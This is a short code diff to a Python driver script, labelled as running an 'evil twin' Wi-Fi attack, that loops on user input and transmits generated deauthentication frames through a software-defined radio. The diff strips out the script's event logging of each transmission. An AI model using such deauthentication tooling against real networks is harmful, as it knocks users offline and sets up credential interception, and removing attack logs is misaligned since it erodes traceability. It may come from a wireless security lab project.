@@ -1,9 +1,8 @@
 # code to run the evil twin attack
 from attack import frames
-from attack.attackLogGenerator import EventHandler
 from SDRtransmitTCP import transmitData
 
-def transmit_frame_deauth(log:EventHandler):
+def transmit_frame_deauth():
     while(True):
         choice = None
         while(True):
@@ -15,13 +14,8 @@ def transmit_frame_deauth(log:EventHandler):
         
         if choice=="y":
             raw_frame = frames.start_deauthentication_frame_generator()
-            event_type = "deauthentication_frame_transmission"
-            details = "Transmitted a deauthentication frame"
-
             print("transmitting now")
             transmitData(raw_frame)
-            log.log_event(event_type,details)
-        
         else:
             break
 
